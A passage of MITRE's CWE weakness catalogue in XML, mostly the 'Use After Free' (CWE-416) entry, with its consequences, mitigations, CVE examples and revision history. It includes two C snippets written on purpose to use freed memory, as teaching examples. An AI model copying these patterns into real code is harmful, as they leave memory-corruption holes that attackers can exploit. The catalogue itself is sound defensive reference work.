            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-07-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Description, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-10-29</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-12-28</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, Observed_Examples, Other_Notes, Potential_Mitigations, References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-02-16</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Detection_Factors, Potential_Mitigations, References, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-04-05</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-06-21</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-09-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-06-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-05-11</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2013-07-17</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-19</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-11-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Likelihood_of_Exploit, Potential_Mitigations, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-03-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated References, Type</ns0:Modification_Comment>
            </ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-01-03</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Alternate_Terms, Description, Name, Relationships, Taxonomy_Mappings, Theoretical_Notes</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-06-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-09-19</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Description, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-02-24</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Description, References, Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-06-25</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Description, Maintenance_Notes</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-08-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-04-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Related_Attack_Patterns</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-06-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Observed_Examples, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-10-13</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Observed_Examples, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-01-31</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Common_Consequences, Description, Detection_Factors, Maintenance_Notes, Related_Attack_Patterns, Taxonomy_Mappings</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-04-27</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Demonstrative_Examples, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-06-29</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Mapping_Notes, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
            <ns0:Contribution Type="Content">
               <ns0:Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</ns0:Contribution_Name>
               <ns0:Contribution_Organization>CWE-CAPEC ICS/OT SIG</ns0:Contribution_Organization>
               <ns0:Contribution_Date>2023-01-24</ns0:Contribution_Date>
			   <ns0:Contribution_Version>4.10</ns0:Contribution_Version>
			   <ns0:Contribution_ReleaseDate>2023-01-31</ns0:Contribution_ReleaseDate>
               <ns0:Contribution_Comment>Suggested mappings to ISA/IEC 62443.</ns0:Contribution_Comment>
            </ns0:Contribution>
            <ns0:Contribution Type="Content">
               <ns0:Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</ns0:Contribution_Name>
               <ns0:Contribution_Organization>CWE-CAPEC ICS/OT SIG</ns0:Contribution_Organization>
               <ns0:Contribution_Date>2023-04-25</ns0:Contribution_Date>
               <ns0:Contribution_Comment>Suggested mappings to ISA/IEC 62443.</ns0:Contribution_Comment>
            </ns0:Contribution>
            <ns0:Previous_Entry_Name Date="2008-10-14">Resource Exhaustion</ns0:Previous_Entry_Name>
            <ns0:Previous_Entry_Name Date="2009-05-27">Uncontrolled Resource Consumption (aka 'Resource Exhaustion')</ns0:Previous_Entry_Name>
			<ns0:Previous_Entry_Name Date="2019-01-03">Uncontrolled Resource Consumption ('Resource Exhaustion')</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Weakness>
      <ns0:Weakness ID="416" Name="Use After Free" Abstraction="Variant" Structure="Simple" Status="Stable">
         <ns0:Description>Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>The use of previously-freed memory can have any number of adverse consequences, ranging from the corruption of valid data to the execution of arbitrary code, depending on the instantiation and timing of the flaw. The simplest way data corruption may occur involves the system's reuse of the freed memory. Use-after-free errors have two common and sometimes overlapping causes:</html:p>
               <html:ul>
                  <html:li>Error conditions and other exceptional circumstances.</html:li>
                  <html:li>Confusion over which part of the program is responsible for freeing the memory.</html:li>
               </html:ul>
            <html:p>In this scenario, the memory in question is allocated to another pointer validly at some point after it has been freed. The original pointer to the freed memory is used again and points to somewhere within the new allocation. As the data is changed, it corrupts the validly used memory; this induces undefined behavior in the process.</html:p>
            <html:p>If the newly allocated data happens to hold a class, in C++ for example, various function pointers may be scattered within the heap data. If one of these function pointers is overwritten with an address to valid shellcode, execution of arbitrary code can be achieved.</html:p>
         </ns0:Extended_Description>
         <ns0:Related_Weaknesses>
             <ns0:Related_Weakness Nature="ChildOf" CWE_ID="825" View_ID="1000" Ordinal="Primary" />
             <ns0:Related_Weakness Nature="ChildOf" CWE_ID="672" View_ID="1003" Ordinal="Primary" />
             <ns0:Related_Weakness Nature="ChildOf" CWE_ID="672" View_ID="1305" Ordinal="Primary" />
			 <ns0:Related_Weakness Nature="ChildOf" CWE_ID="672" View_ID="1340" Ordinal="Primary" />
             <ns0:Related_Weakness Nature="CanPrecede" CWE_ID="120" View_ID="1000" />
             <ns0:Related_Weakness Nature="CanPrecede" CWE_ID="123" View_ID="1000" />
         </ns0:Related_Weaknesses>
         <ns0:Applicable_Platforms>
            <ns0:Language Name="C" Prevalence="Undetermined" />
            <ns0:Language Name="C++" Prevalence="Undetermined" />
         </ns0:Applicable_Platforms>
         <ns0:Alternate_Terms>
            <ns0:Alternate_Term>
               <ns0:Term>Dangling pointer</ns0:Term>
            </ns0:Alternate_Term>
            <ns0:Alternate_Term>
               <ns0:Term>Use-After-Free</ns0:Term>
            </ns0:Alternate_Term>
         </ns0:Alternate_Terms>
         <ns0:Modes_Of_Introduction>
            <ns0:Introduction>
               <ns0:Phase>Implementation</ns0:Phase>
            </ns0:Introduction>
         </ns0:Modes_Of_Introduction>
         <ns0:Likelihood_Of_Exploit>High</ns0:Likelihood_Of_Exploit>
         <ns0:Common_Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Memory</ns0:Impact>
               <ns0:Note>The use of previously freed memory may corrupt valid data, if the memory area in question has been allocated and used properly elsewhere.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>DoS: Crash, Exit, or Restart</ns0:Impact>
               <ns0:Note>If chunk consolidation occurs after the use of previously freed data, the process may crash when invalid data is used as chunk information.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Code or Commands</ns0:Impact>
               <ns0:Note>If malicious data is entered before chunk consolidation can take place, it may be possible to take advantage of a write-what-where primitive to execute arbitrary code.</ns0:Note>
            </ns0:Consequence>
         </ns0:Common_Consequences>
         <ns0:Detection_Methods>
           <ns0:Detection_Method Detection_Method_ID="DM-13">
             <ns0:Method>Fuzzing</ns0:Method>
             <ns0:Description>Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.</ns0:Description>
             <ns0:Effectiveness>High</ns0:Effectiveness>
           </ns0:Detection_Method>
           <ns0:Detection_Method Detection_Method_ID="DM-14">
             <ns0:Method>Automated Static Analysis</ns0:Method>
             <ns0:Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</ns0:Description>
             <ns0:Effectiveness>High</ns0:Effectiveness>
           </ns0:Detection_Method>
         </ns0:Detection_Methods>
         <ns0:Potential_Mitigations>
            <ns0:Mitigation>
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Description>Choose a language that provides automatic memory management.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>When freeing pointers, be sure to set them to NULL once they are freed. However, the utilization of multiple or complex data structures may lower the usefulness of this strategy.</ns0:Description>
            </ns0:Mitigation>
         </ns0:Potential_Mitigations>
         <ns0:Demonstrative_Examples>
            <ns0:Demonstrative_Example>
               <ns0:Intro_Text>The following example demonstrates the weakness.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>#include &lt;stdio.h&gt;<html:br />#include &lt;unistd.h&gt;<html:br />#define BUFSIZER1 512<html:br />#define BUFSIZER2 ((BUFSIZER1/2) - 8)<html:br />int main(int argc, char **argv) {<html:div style="margin-left:1em;">char *buf1R1;<html:br />char *buf2R1;<html:br />char *buf2R2;<html:br />char *buf3R2;<html:br />buf1R1 = (char *) malloc(BUFSIZER1);<html:br />buf2R1 = (char *) malloc(BUFSIZER1);<html:br />free(buf2R1);<html:br />buf2R2 = (char *) malloc(BUFSIZER2);<html:br />buf3R2 = (char *) malloc(BUFSIZER2);<html:br />strncpy(buf2R1, argv[1], BUFSIZER1-1);<html:br />free(buf1R1);<html:br />free(buf2R2);<html:br />free(buf3R2);</html:div>}</html:div>
               </ns0:Example_Code>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example>
               <ns0:Intro_Text>The following code illustrates a use after free error:</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>char* ptr = (char*)malloc (SIZE);<html:br />if (err) {<html:div style="margin-left:1em;">abrt = 1;<html:br />free(ptr);</html:div>}<html:br />...<html:br />if (abrt) {<html:div style="margin-left:1em;">logError("operation aborted before commit", ptr);</html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>When an error occurs, the pointer is immediately freed. However, this pointer is later incorrectly used in the logError function.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
         </ns0:Demonstrative_Examples>
         <ns0:Observed_Examples>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2021-0920</ns0:Reference>
               <ns0:Description>Chain: mobile platform race condition (CWE-362) leading to use-after-free (CWE-416), as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2021-0920</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-6819</ns0:Reference>
               <ns0:Description>Chain: race condition (CWE-362) leads to use-after-free (CWE-416), as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-6819</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2010-4168</ns0:Reference>
               <ns0:Description>Use-after-free triggered by closing a connection while data is still being transmitted.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2010-4168</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2010-2941</ns0:Reference>
               <ns0:Description>Improper allocation for invalid data leads to use-after-free.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2010-2941</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2010-2547</ns0:Reference>
               <ns0:Description>certificate with a large number of Subject Alternate Names not properly handled in realloc, leading to use-after-free</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2010-2547</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2010-1772</ns0:Reference>
               <ns0:Description>Timers are not disabled when a related object is deleted</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2010-1772</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2010-1437</ns0:Reference>
               <ns0:Description>Access to a "dead" object that is being cleaned up</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2010-1437</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2010-1208</ns0:Reference>
               <ns0:Description>object is deleted even with a non-zero reference count, and later accessed</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2010-1208</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2010-0629</ns0:Reference>
               <ns0:Description>use-after-free involving request containing an invalid version number</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2010-0629</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2010-0378</ns0:Reference>
               <ns0:Description>unload of an object that is currently being accessed by other functionality</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2010-0378</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2010-0302</ns0:Reference>
               <ns0:Description>incorrectly tracking a reference count leads to use-after-free</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2010-0302</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2010-0249</ns0:Reference>
               <ns0:Description>use-after-free related to use of uninitialized memory</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2010-0249</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2010-0050</ns0:Reference>
               <ns0:Description>HTML document with incorrectly-nested tags</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2010-0050</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-3658</ns0:Reference>
               <ns0:Description>Use after free in ActiveX object by providing a malformed argument to a method</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-3658</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-3616</ns0:Reference>
               <ns0:Description>use-after-free by disconnecting during data transfer, or a message containing incorrect data types</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-3616</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-3553</ns0:Reference>
               <ns0:Description>disconnect during a large data transfer causes incorrect reference count, leading to use-after-free</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-3553</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-2416</ns0:Reference>
               <ns0:Description>use-after-free found by fuzzing</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2416</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-1837</ns0:Reference>
               <ns0:Description>Chain: race condition (CWE-362) from improper handling of a page transition in web client while an applet is loading (CWE-368) leads to use after free (CWE-416)</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-1837</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-0749</ns0:Reference>
               <ns0:Description>realloc generates new buffer and pointer, but previous pointer is still retained, leading to use after free</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-0749</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2010-3328</ns0:Reference>
               <ns0:Description>Use-after-free in web browser, probably resultant from not initializing memory.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2010-3328</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-5038</ns0:Reference>
               <ns0:Description>use-after-free when one thread accessed memory that was freed by another thread</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-5038</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-0077</ns0:Reference>
               <ns0:Description>assignment of malformed values to certain properties triggers use after free</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-0077</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2006-4434</ns0:Reference>
               <ns0:Description>mail server does not properly handle a long header.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2006-4434</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2010-2753</ns0:Reference>
               <ns0:Description>chain: integer overflow leads to use-after-free</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2010-2753</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2006-4997</ns0:Reference>
               <ns0:Description>freed pointer dereference</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2006-4997</ns0:Link>
            </ns0:Observed_Example>
         </ns0:Observed_Examples>
         <ns0:Affected_Resources>
            <ns0:Affected_Resource>Memory</ns0:Affected_Resource>
         </ns0:Affected_Resources>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <ns0:Entry_Name>Use After Free</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CLASP">
               <ns0:Entry_Name>Using freed memory</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <ns0:Entry_ID>MEM00-C</ns0:Entry_ID>
               <ns0:Entry_Name>Allocate and free memory in the same module, at the same level of abstraction</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <ns0:Entry_ID>MEM01-C</ns0:Entry_ID>
               <ns0:Entry_Name>Store a new value in pointers immediately after free()</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <ns0:Entry_ID>MEM30-C</ns0:Entry_ID>
               <ns0:Entry_Name>Do not access freed memory</ns0:Entry_Name>
               <ns0:Mapping_Fit>Exact</ns0:Mapping_Fit>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <ns0:Entry_ID>SFP15</ns0:Entry_ID>
               <ns0:Entry_Name>Faulty Resource Use</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-6" />
            <ns0:Reference External_Reference_ID="REF-18" />
            <ns0:Reference External_Reference_ID="REF-44" Section="&quot;Sin 8: C++ Catastrophes.&quot; Page 143" />
         </ns0:References>
         <ns0:Mapping_Notes>
            <ns0:Usage>Allowed</ns0:Usage>
            <ns0:Rationale>This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</ns0:Rationale>
            <ns0:Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</ns0:Comments>
            <ns0:Reasons>
               <ns0:Reason Type="Acceptable-Use" />
            </ns0:Reasons>
         </ns0:Mapping_Notes>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>7 Pernicious Kingdoms</ns0:Submission_Name>
               <ns0:Submission_Date>2006-07-19</ns0:Submission_Date>
               <ns0:Submission_Version>Draft 3</ns0:Submission_Version>
               <ns0:Submission_ReleaseDate>2006-07-19</ns0:Submission_ReleaseDate>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>Eric Dalci</ns0:Modification_Name>
               <ns0:Modification_Organization>Cigital</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-07-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Organization>KDM Analytics</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-08-01</ns0:Modification_Date>
               <ns0:Modification_Comment>added/updated white box definitions</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-09-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Applicable_Platforms, Common_Consequences, Relationships, Observed_Example, Other_Notes, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-11-24</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-03-10</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-05-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-10-29</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-02-16</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-06-21</ns0:Modification_Date>
